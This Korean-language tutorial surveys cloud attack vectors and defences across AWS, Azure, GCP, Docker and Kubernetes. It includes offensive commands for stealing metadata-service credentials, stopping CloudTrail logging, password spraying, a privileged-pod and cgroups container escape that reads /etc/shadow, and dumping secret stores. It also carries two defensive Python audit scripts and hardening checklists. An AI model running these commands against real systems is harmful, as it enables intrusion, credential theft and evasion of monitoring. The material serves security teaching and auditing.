# 클라우드 공격 벡터 완전 분석

## 클라우드 위협 모델

```
클라우드 공격 표면
───────────────────────────────────────────
  외부 공격자          내부자          공급망
      │                  │               │
  잘못된 설정         과도한 권한      취약한 의존성
  노출된 API         자격증명 도용    악성 이미지
  취약한 앱          데이터 무단접근  CI/CD 공격
      └──────────────────┴───────────────┘
                         │
                   클라우드 자산
              (S3/Storage/인스턴스/DB)
───────────────────────────────────────────
```

---

## 1. AWS 주요 공격 벡터

### IAM 권한 남용


AWS IAM(Identity and Access Management) 설정 오류는 권한 상승의 주요 경로입니다. 과도한 권한이 부여된 역할이나 액세스 키가 노출되면 공격자가 전체 AWS 환경을 장악할 수 있습니다.

```
IAM 공격 체인:
  공개 EC2 접근
      │
  임시 자격증명 획득 (메타데이터 서비스)
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
      │
  IAM 역할 권한 확인
  aws iam list-attached-role-policies --role-name ROLE_NAME
      │
  권한 상승 기회 탐색
  aws iam simulate-principal-policy
      │
  관리자 권한 획득
  → 전체 AWS 계정 탈취
```

```bash
# IMDS(인스턴스 메타데이터 서비스) 악용
# EC2 내부에서 임시 자격증명 획득
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → 역할 이름 반환

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
# → AccessKeyId, SecretAccessKey, Token 반환

# 탈취한 자격증명으로 AWS CLI 사용
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity  # 현재 권한 확인
aws iam list-users           # 사용자 목록
aws s3 ls                    # S3 버킷 목록
```

### S3 버킷 오설정


S3 버킷 설정 오류는 가장 흔한 클라우드 보안 사고 원인입니다. 퍼블릭 액세스가 허용된 버킷은 인증 없이 내용을 열람하거나 파일을 업로드할 수 있으므로, `aws s3 ls` 명령으로 접근 가능 여부를 확인합니다.

```bash
# 공개 버킷 탐지
aws s3api list-buckets --query 'Buckets[].Name'

# 버킷 공개 접근 확인
aws s3api get-bucket-acl --bucket TARGET_BUCKET
aws s3api get-bucket-policy --bucket TARGET_BUCKET

# 공개 버킷 내용 나열 (인증 없이)
aws s3 ls s3://TARGET_BUCKET --no-sign-request

# 파일 다운로드
aws s3 cp s3://TARGET_BUCKET/sensitive.txt . --no-sign-request

# S3 버킷 브루트포스
# 버킷 이름: company-name, company-backup, company-dev, company-staging...
for suffix in "" "-backup" "-dev" "-staging" "-prod" "-data" "-logs"; do
    aws s3 ls "s3://target-company${suffix}" --no-sign-request 2>/dev/null && \
    echo "[+] 공개 버킷 발견: target-company${suffix}"
done
```

### CloudTrail 로그 비활성화 (흔적 제거)

```bash
# CloudTrail 현황 확인
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name mytrail

# 로깅 중지 (공격자 행위)
aws cloudtrail stop-logging --name mytrail

# 이벤트 선택기 수정으로 특정 API 제외
aws cloudtrail put-event-selectors --trail-name mytrail \
    --event-selectors '[{"ReadWriteType":"None"}]'
```

### Lambda 함수 공격

```python
#!/usr/bin/env python3
"""
AWS IAM 권한 상승 경로 분석 도구 (방어 목적 — 레드팀/감사 전용)
사용: python3 iam_privesc_check.py --profile default --region ap-northeast-2
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass, field
from typing import Optional

import boto3
from botocore.exceptions import ClientError, NoCredentialsError


@dataclass
class PrivEscPath:
    permission: str
    description: str
    risk: str  # CRITICAL | HIGH | MEDIUM
    remediation: str


# 알려진 권한 상승 경로 (Rhino Security Labs 연구 기반)
KNOWN_PRIVESC: list[PrivEscPath] = [
    PrivEscPath("iam:CreatePolicyVersion",      "기존 정책에 신규 버전(Administrator) 추가",      "CRITICAL", "iam:CreatePolicyVersion 권한 제거"),
    PrivEscPath("iam:SetDefaultPolicyVersion",  "이전에 저장된 고권한 정책 버전 활성화",          "CRITICAL", "iam:SetDefaultPolicyVersion 권한 제거"),
    PrivEscPath("iam:AttachUserPolicy",          "자신에게 AdministratorAccess 정책 부여",         "CRITICAL", "권한 범위를 특정 ARN으로 제한"),
    PrivEscPath("iam:AttachGroupPolicy",         "자신이 속한 그룹에 고권한 정책 부여",            "CRITICAL", "권한 범위를 특정 ARN으로 제한"),
    PrivEscPath("iam:PutUserPolicy",             "인라인 정책으로 자신에게 권한 부여",             "CRITICAL", "iam:PutUserPolicy 권한 제거"),
    PrivEscPath("iam:AddUserToGroup",            "고권한 그룹에 자신을 추가",                      "HIGH",     "권한 범위를 특정 그룹 ARN으로 제한"),
    PrivEscPath("iam:UpdateAssumeRolePolicy",    "신뢰 정책 수정으로 고권한 역할 Assume 가능",     "HIGH",     "iam:UpdateAssumeRolePolicy 권한 제거"),
    PrivEscPath("iam:CreateAccessKey",           "다른 IAM 사용자의 접근 키 생성",                 "HIGH",     "권한 범위를 자신의 ARN으로 제한"),
    PrivEscPath("iam:CreateLoginProfile",        "다른 사용자 콘솔 비밀번호 설정",                 "HIGH",     "권한 범위를 자신의 ARN으로 제한"),
    PrivEscPath("lambda:UpdateFunctionCode",     "고권한 Lambda 코드 교체 후 실행",                "HIGH",     "특정 함수 ARN으로 범위 제한"),
    PrivEscPath("ec2:AssociateIamInstanceProfile", "EC2에 고권한 역할 프로파일 연결",              "HIGH",     "특정 인스턴스 ARN으로 제한"),
    PrivEscPath("cloudformation:CreateStack",   "CloudFormation으로 고권한 역할 생성/사용",        "MEDIUM",   "cloudformation:CreateStack 역할 ARN 제한"),
    PrivEscPath("glue:CreateDevEndpoint",        "Glue 개발 엔드포인트에 고권한 역할 사용",        "MEDIUM",   "Glue 역할 ARN을 제한"),
    PrivEscPath("datapipeline:CreatePipeline",  "데이터 파이프라인으로 고권한 역할 실행",          "MEDIUM",   "datapipeline 역할 ARN 제한"),
    PrivEscPath("iam:PassRole",                  "다른 서비스로 고권한 역할 전달",                  "MEDIUM",   "iam:PassRole 대상 역할 ARN을 엄격히 제한"),
]


@dataclass
class CheckResult:
    principal_arn: str
    allowed_permissions: list[str] = field(default_factory=list)
    privesc_paths: list[PrivEscPath] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "principal_arn": self.principal_arn,
            "allowed_permissions": self.allowed_permissions,
            "privesc_paths": [
                {
                    "permission": p.permission,
                    "description": p.description,
                    "risk": p.risk,
                    "remediation": p.remediation,
                }
                for p in self.privesc_paths
            ],
        }


# ------------------------------------------------------------------ #
#  권한 시뮬레이션
# ------------------------------------------------------------------ #
class IAMPrivEscChecker:
    def __init__(self, session: boto3.Session) -> None:
        self.iam = session.client("iam")
        self.sts = session.client("sts")

    def get_caller_arn(self) -> str:
        return self.sts.get_caller_identity()["Arn"]

    def simulate_permissions(
        self,
        principal_arn: str,
        actions: list[str],
        resource: str = "*",
    ) -> list[str]:
        """시뮬레이션으로 허용된 권한 목록 반환"""
        allowed: list[str] = []
        # API 한계: 한 번에 최대 100개 액션
        chunk_size = 100
        for i in range(0, len(actions), chunk_size):
            chunk = actions[i : i + chunk_size]
            try:
                resp = self.iam.simulate_principal_policy(
                    PolicySourceArn=principal_arn,
                    ActionNames=chunk,
                    ResourceArns=[resource],
                )
                for ev in resp.get("EvaluationResults", []):
                    if ev.get("EvalDecision") == "allowed":
                        allowed.append(ev["EvalActionName"])
            except ClientError as exc:
                if exc.response["Error"]["Code"] != "NoSuchEntity":
                    raise
        return allowed

    def check(self, principal_arn: Optional[str] = None) -> CheckResult:
        if principal_arn is None:
            principal_arn = self.get_caller_arn()

        actions = [p.permission for p in KNOWN_PRIVESC]
        print(f"[*] 권한 시뮬레이션: {principal_arn}", file=sys.stderr)
        allowed = self.simulate_permissions(principal_arn, actions)

        allowed_set = set(allowed)
        result = CheckResult(principal_arn=principal_arn, allowed_permissions=allowed)
        result.privesc_paths = [p for p in KNOWN_PRIVESC if p.permission in allowed_set]
        return result


# ------------------------------------------------------------------ #
#  출력
# ------------------------------------------------------------------ #
def print_report(result: CheckResult, as_json: bool = False) -> None:
    if as_json:
        print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))
        return

    print(f"\n{'='*65}")
    print(f"주체 ARN : {result.principal_arn}")
    print(f"허용 권한: {len(result.allowed_permissions)}개")
    print(f"권한 상승 경로: {len(result.privesc_paths)}개")

    if not result.privesc_paths:
        print("\n[+] 권한 상승 경로 없음")
        return

    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    for p in sorted(result.privesc_paths, key=lambda x: risk_order.get(x.risk, 9)):
        color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[94m"}.get(p.risk, "")
        reset = "\033[0m"
        print(f"\n  [{color}{p.risk}{reset}] {p.permission}")
        print(f"    설명: {p.description}")
        print(f"    조치: {p.remediation}")


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="AWS IAM 권한 상승 경로 분석 도구 (감사/레드팀 전용)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n"
               "  python3 iam_privesc_check.py --profile default\n"
               "  python3 iam_privesc_check.py --profile audit --arn arn:aws:iam::123:user/bob\n"
               "  python3 iam_privesc_check.py --profile default --json",
    )
    parser.add_argument("--profile", default="default", help="AWS CLI 프로파일 (기본: default)")
    parser.add_argument("--region", default="ap-northeast-2", help="AWS 리전")
    parser.add_argument("--arn", metavar="ARN", help="분석할 주체 ARN (미지정 시 현재 자격증명)")
    parser.add_argument("--json", action="store_true", help="JSON 형식 출력")
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    try:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
        checker = IAMPrivEscChecker(session)
        result = checker.check(principal_arn=args.arn)
        print_report(result, as_json=args.json)
    except NoCredentialsError:
        print("[-] AWS 자격증명 없음 — aws configure 실행 후 재시도", file=sys.stderr)
        sys.exit(1)
    except ClientError as exc:
        print(f"[-] AWS API 오류: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## 2. Azure 공격 벡터

### Azure AD 공격

```bash
# AzureAD 정찰 (ROADtools)
pip install roadrecon
roadrecon gather -u user@company.com -p password
roadrecon gui

# 게스트 계정으로 탐색
az login --tenant TENANT_ID
az ad user list --query "[].{UPN:userPrincipalName,Id:id}"
az ad group list --query "[].{Name:displayName}"
az ad sp list --query "[].{Name:displayName,AppId:appId}"

# 관리 단위 탐색
az rest --method GET \
    --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits"

# 조건부 접근 정책 우회 (레거시 인증)
# 조건부 접근이 Modern Auth만 차단할 때
# IMAP/POP3/SMTP (레거시)로 인증 시도
python3 o365spray.py --enum --userfile users.txt --domain company.com
python3 o365spray.py --spray -p "Spring2024!" --userfile valid_users.txt
```

### Azure SSRF via IMDS

```bash
# Azure VM에서 메타데이터 접근
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 관리 ID 토큰 획득
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"

# 획득한 토큰으로 Azure API 사용
TOKEN=$(curl -H "Metadata: true" "http://169.254.169.254/..." | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## 3. GCP 공격 벡터

```bash
# GCP 메타데이터 서비스
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"

# 서비스 계정 키 탐색
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=SA_EMAIL

# 스토리지 버킷 공개 접근
gsutil ls gs://TARGET_BUCKET
gsutil cat gs://TARGET_BUCKET/sensitive_file.txt

# GCP 권한 열거
gcloud projects get-iam-policy PROJECT_ID
gcloud iam roles list
gcloud iam service-accounts get-iam-policy SA_EMAIL
```

---

## 4. 컨테이너/Kubernetes 공격

### Docker 취약점

```bash
# Docker 소켓 노출 탐지 및 악용
# 취약: docker.sock이 컨테이너에 마운트된 경우
ls -la /var/run/docker.sock

# 컨테이너 이스케이프 (privileged 컨테이너)
# 호스트 파일시스템 마운트
docker run --privileged -v /:/host alpine chroot /host /bin/bash

# 호스트 네트워크 접근
docker run --net=host alpine

# 위험한 실행 명령
docker run --cap-add=SYS_ADMIN --security-opt seccomp=unconfined ...
```

### Kubernetes 공격

```bash
# API 서버 공개 접근 탐지
kubectl --server=https://TARGET_K8S:6443 get pods --all-namespaces \
    --insecure-skip-tls-verify

# 익명 접근 가능 여부 확인
curl -k https://TARGET_K8S:6443/api/v1/namespaces
curl -k https://TARGET_K8S:6443/api/v1/secrets

# ServiceAccount 토큰 활용
# 파드 내부에서:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc/api/v1/namespaces \
    -H "Authorization: Bearer $TOKEN"

# RBAC 권한 확인
kubectl auth can-i --list
kubectl auth can-i get secrets -n kube-system

# 권한 상승 (create pods 권한 있을 때)
# 호스트 마운트가 있는 특권 파드 생성
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
spec:
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-volume
  volumes:
  - name: host-volume
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF

# etcd 직접 접근 (API 서버 우회)
etcdctl --endpoints=https://ETCD_IP:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    get / --prefix --keys-only | grep secrets
```

### 컨테이너 이스케이프 기법

```bash
# 기법 1: /proc/sched_debug 정보 유출
cat /proc/sched_debug | grep -i "host"

# 기법 2: cgroups notify_on_release
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# 기법 3: CVE-2019-5736 (runc 취약점)
# runc 버전 < 1.0-rc6에서 호스트 runc 덮어쓰기 가능
```

---

## 5. 서버리스 공격

```python
#!/usr/bin/env python3
"""
AWS Lambda 환경변수 시크릿 노출 감사 도구 (방어 목적)
사용: python3 lambda_secret_audit.py --profile default --region ap-northeast-2
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from dataclasses import dataclass, field
from typing import Optional

import boto3
from botocore.exceptions import ClientError, NoCredentialsError


# 민감 키 패턴
_SENSITIVE_KEY_RE = re.compile(
    r"(?i)(secret|password|passwd|api[_-]?key|token|credential|db[_-]?pass|"
    r"private[_-]?key|access[_-]?key|auth|jwt|bearer|certificate)"
)

# 알려진 시크릿 값 패턴 (하드코딩된 값 탐지)
_SECRET_VALUE_RE = re.compile(
    r"(?i)(AKIA[0-9A-Z]{16}|"                  # AWS Access Key ID
    r"[0-9a-zA-Z/+]{40}|"                       # AWS Secret Key 길이
    r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.|"    # JWT
    r"ghp_[A-Za-z0-9]{36}|"                    # GitHub PAT
    r"sk-[A-Za-z0-9]{32,})"                    # OpenAI 등
)


@dataclass
class FunctionFinding:
    function_name: str
    function_arn: str
    runtime: str
    role: str
    sensitive_env_vars: list[dict] = field(default_factory=list)
    hardcoded_secrets: list[dict] = field(default_factory=list)

    @property
    def has_issues(self) -> bool:
        return bool(self.sensitive_env_vars or self.hardcoded_secrets)

    def to_dict(self) -> dict:
        return {
            "function_name": self.function_name,
            "function_arn": self.function_arn,
            "runtime": self.runtime,
            "role": self.role,
            "sensitive_env_vars": self.sensitive_env_vars,
            "hardcoded_secrets": self.hardcoded_secrets,
        }


class LambdaSecretAuditor:
    def __init__(self, session: boto3.Session) -> None:
        self.lmb = session.client("lambda")
        self.findings: list[FunctionFinding] = []

    def _paginate_functions(self):
        paginator = self.lmb.get_paginator("list_functions")
        for page in paginator.paginate():
            yield from page.get("Functions", [])

    def _analyze_env_vars(
        self, env_vars: dict[str, str], function_name: str
    ) -> tuple[list[dict], list[dict]]:
        sensitive: list[dict] = []
        hardcoded: list[dict] = []

        for key, value in env_vars.items():
            if _SENSITIVE_KEY_RE.search(key):
                entry = {"key": key, "value_preview": value[:8] + "..." if len(value) > 8 else value}
                sensitive.append(entry)

                # 하드코딩된 실제 시크릿 값 탐지
                if _SECRET_VALUE_RE.search(value):
                    hardcoded.append({
                        "key": key,
                        "pattern_matched": True,
                        "recommendation": "AWS Secrets Manager 또는 SSM Parameter Store로 이전",
                    })

        return sensitive, hardcoded

    def audit(self) -> list[FunctionFinding]:
        print("[*] Lambda 함수 목록 조회 중...", file=sys.stderr)
        count = 0
        for fn in self._paginate_functions():
            count += 1
            name = fn["FunctionName"]
            arn = fn["FunctionArn"]
            runtime = fn.get("Runtime", "unknown")
            role = fn.get("Role", "")

            try:
                cfg = self.lmb.get_function_configuration(FunctionName=arn)
            except ClientError:
                continue

            env = cfg.get("Environment", {}).get("Variables", {})
            if not env:
                continue

            sensitive, hardcoded = self._analyze_env_vars(env, name)

            if sensitive:
                finding = FunctionFinding(
                    function_name=name,
                    function_arn=arn,
                    runtime=runtime,
                    role=role,
                    sensitive_env_vars=sensitive,
                    hardcoded_secrets=hardcoded,
                )
                self.findings.append(finding)

        print(f"[*] {count}개 함수 분석 완료", file=sys.stderr)
        return self.findings


# ------------------------------------------------------------------ #
#  출력
# ------------------------------------------------------------------ #
def print_report(findings: list[FunctionFinding], as_json: bool = False) -> None:
    issues = [f for f in findings if f.has_issues]

    if as_json:
        print(json.dumps([f.to_dict() for f in issues], ensure_ascii=False, indent=2))
        return

    print(f"\n{'='*65}")
    print(f"문제 있는 함수: {len(issues)}개")

    for finding in issues:
        print(f"\n  함수: {finding.function_name}")
        print(f"  ARN : {finding.function_arn}")
        print(f"  런타임: {finding.runtime}")
        if finding.sensitive_env_vars:
            print(f"  민감 환경변수 ({len(finding.sensitive_env_vars)}개):")
            for ev in finding.sensitive_env_vars:
                icon = "!!" if any(h["key"] == ev["key"] for h in finding.hardcoded_secrets) else " "
                print(f"    [{icon}] {ev['key']} = {ev['value_preview']}")
        if finding.hardcoded_secrets:
            print(f"  하드코딩 의심 항목:")
            for hc in finding.hardcoded_secrets:
                print(f"    - {hc['key']}: {hc['recommendation']}")

    if not issues:
        print("[+] 민감 환경변수 노출 없음")


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Lambda 환경변수 시크릿 노출 감사 도구",
        epilog="예시:\n"
               "  python3 lambda_secret_audit.py --profile default\n"
               "  python3 lambda_secret_audit.py --profile prod --region us-east-1 --json",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--profile", default="default", help="AWS 프로파일")
    parser.add_argument("--region", default="ap-northeast-2", help="AWS 리전")
    parser.add_argument("--json", action="store_true", help="JSON 출력")
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    try:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
        auditor = LambdaSecretAuditor(session)
        findings = auditor.audit()
        print_report(findings, as_json=args.json)
    except NoCredentialsError:
        print("[-] AWS 자격증명 없음", file=sys.stderr)
        sys.exit(1)
    except ClientError as exc:
        print(f"[-] AWS 오류: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## 6. 클라우드 측면 이동 (Lateral Movement)


AWS CLI를 활용한 클라우드 환경 침투 테스트 명령어입니다. 잘못 설정된 S3 버킷, 과도한 IAM 권한, 공개된 메타데이터 서비스(SSRF 취약점) 등이 주요 공격 벡터입니다.

```bash
# AWS: 역할 전환 (AssumeRole)
aws sts assume-role \
    --role-arn "arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole" \
    --role-session-name "attacker"

# 전환된 역할로 다른 계정 접근
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls  # 다른 AWS 계정에서 실행

# VPC 피어링을 통한 내부 이동
aws ec2 describe-vpc-peering-connections
aws ec2 describe-route-tables

# Transit Gateway를 통한 이동
aws ec2 describe-transit-gateways
```

---

## 7. 클라우드 데이터 유출 기법


AWS CLI를 활용한 클라우드 환경 침투 테스트 명령어입니다. 잘못 설정된 S3 버킷, 과도한 IAM 권한, 공개된 메타데이터 서비스(SSRF 취약점) 등이 주요 공격 벡터입니다.

```bash
# S3 버킷 전체 다운로드
aws s3 sync s3://target-bucket . --no-sign-request

# RDS 스냅샷 공유
aws rds describe-db-snapshots --owner-id ACCOUNT_ID
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier snap-xxx \
    --attribute-name restore \
    --values-to-add "all"  # 공개로 변경

# CloudFormation 템플릿 (시크릿 포함)
aws cloudformation get-template --stack-name STACK_NAME

# AWS Secrets Manager 덤프
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# Parameter Store 덤프
aws ssm get-parameters-by-path --path "/" --recursive \
    --with-decryption
```

---

## 8. 방어: 클라우드 보안 강화


AWS CLI를 활용한 클라우드 환경 침투 테스트 명령어입니다. 잘못 설정된 S3 버킷, 과도한 IAM 권한, 공개된 메타데이터 서비스(SSRF 취약점) 등이 주요 공격 벡터입니다.

```bash
# AWS Security Hub 활성화
aws securityhub enable-security-hub
aws securityhub enable-standards \
    --standards-subscription-requests "StandardsArn=arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.2.0"

# GuardDuty 활성화
aws guardduty create-detector --enable

# S3 블록 공개 접근
aws s3api put-public-access-block \
    --bucket TARGET_BUCKET \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# IMDSv2 강제 (SSRF 방어)
aws ec2 modify-instance-metadata-options \
    --instance-id INSTANCE_ID \
    --http-tokens required \
    --http-endpoint enabled

# CloudTrail 모든 리전 활성화
aws cloudtrail create-trail \
    --name all-region-trail \
    --s3-bucket-name my-cloudtrail-bucket \
    --is-multi-region-trail

# IAM 접근 분석기 활성화
aws accessanalyzer create-analyzer \
    --analyzer-name MyAnalyzer \
    --type ACCOUNT
```

### CIS AWS Foundations 주요 점검 사항

```
IAM:
  □ 루트 계정 MFA 활성화
  □ IAM 비밀번호 정책 강화
  □ 90일 이상 미사용 접근 키 비활성화
  □ 접근 키 주기적 교체 (90일)
  □ CloudTrail에 IAM 정책 변경 알림

스토리지:
  □ S3 공개 접근 차단
  □ S3 버킷 로깅 활성화
  □ S3 서버 측 암호화 (SSE-S3 또는 SSE-KMS)
  □ 중요 버킷 MFA Delete 활성화

네트워크:
  □ VPC 기본 보안 그룹 모든 트래픽 차단
  □ VPC 플로우 로그 활성화
  □ 0.0.0.0/0에 SSH(22) 개방 금지
  □ 0.0.0.0/0에 RDP(3389) 개방 금지

모니터링:
  □ CloudTrail 모든 리전 활성화
  □ CloudTrail 로그 무결성 검증 활성화
  □ GuardDuty 활성화
  □ Security Hub 활성화
  □ Config Rules 설정
```

---

## 9. 클라우드 보안 위협 현황 (2020년대)

### 주요 클라우드 보안 위협 트렌드

```
클라우드 침해 사고 주요 원인 (비율 순):
  1. 잘못된 설정 (Misconfiguration) ─────── 68%
     - 공개 S3 버킷
     - 과도한 IAM 권한
     - 보안 그룹 과다 개방
  
  2. 취약한 자격증명 관리 ────────────────── 19%
     - 하드코딩된 API 키
     - 미사용 접근 키 미삭제
     - MFA 미적용
  
  3. 내부자 위협 ─────────────────────────── 8%
     - 과도한 권한 남용
     - 데이터 무단 유출
  
  4. 취약한 인터페이스/API ───────────────── 5%
     - 인증 없는 API 엔드포인트
     - 취약한 인증 메커니즘
```

### 클라우드 공유 책임 모델
```
             사용자 책임    │    클라우드 제공자 책임
─────────────────────────────────────────────────────
IaaS:    데이터, OS, 앱     │    물리, 네트워크, 하이퍼바이저
PaaS:    데이터, 앱         │    물리~런타임
SaaS:    데이터, 설정       │    물리~앱
─────────────────────────────────────────────────────
공통:    계정 관리, MFA, 암호화 키 관리, 데이터 분류
```

### 클라우드 보안 도구 및 프레임워크
```bash
# ScoutSuite — 다중 클라우드 보안 감사
pip install scoutsuite
scout aws
scout azure --tenant TENANT_ID
scout gcp --project PROJECT_ID

# Prowler — AWS 보안 감사
pip install prowler
prowler aws                          # 전체 점검
prowler aws --checks s3_bucket_public  # 특정 점검

# Pacu — AWS 레드팀 프레임워크
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py
# pacu> import_keys PROFILE_NAME
# pacu> run iam__enum_users_roles_policies_groups
```

---

## 10. Zero Trust 보안 모델

### Zero Trust 핵심 원칙

```
기존 경계 보안:                    Zero Trust:
  외부 = 신뢰 안함                  모든 것 = 신뢰 안함
  내부 = 신뢰함              →      항상 검증
  경계 방화벽 중심                   최소 권한 원칙
                                    지속적 모니터링
```

### Zero Trust 5대 기둥 (NIST SP 800-207 기반)
```
1. ID 및 접근 관리 (Identity)
   - 강력한 MFA 강제
   - 지속적 사용자 검증
   - 조건부 접근 정책

2. 디바이스 보안 (Device)
   - 디바이스 건강 상태 검증
   - 인증된 디바이스만 접근
   - MDM/EDR 필수

3. 네트워크 (Network)
   - 마이크로세그멘테이션
   - 암호화된 통신 (TLS 1.3)
   - 네트워크 트래픽 검사

4. 애플리케이션 워크로드 (Application)
   - API 보안
   - 앱별 접근 제어
   - 런타임 보호

5. 데이터 (Data)
   - 데이터 분류 및 레이블
   - 데이터 암호화 (저장/전송)
   - DLP(데이터 유출 방지)
```

### Zero Trust 구현 단계
```
단계 1: 가시성 확보
  - 모든 자산 식별 및 인벤토리
  - 트래픽 흐름 파악
  - 데이터 분류

단계 2: 마이크로세그멘테이션
  - 레거시 VLAN → 세밀한 정책 기반 분리
  - 동서 트래픽 통제

단계 3: 최소 권한 적용
  - Just-in-Time (JIT) 접근
  - Just-Enough-Access (JEA)
  - 특권 계정 격리 (PAM)

단계 4: 지속적 검증 및 모니터링
  - SIEM/SOAR 통합
  - UEBA (사용자/엔티티 행동 분석)
  - 자동 대응
```
